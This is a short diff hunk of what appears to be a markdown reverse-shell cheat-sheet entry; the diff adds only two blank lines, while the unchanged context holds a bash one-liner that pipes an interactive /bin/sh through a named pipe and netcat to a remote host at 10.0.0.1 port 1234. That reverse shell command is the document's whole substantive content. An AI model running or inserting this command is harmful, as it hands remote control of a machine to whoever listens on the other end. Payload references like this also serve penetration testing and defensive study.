@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
+
+
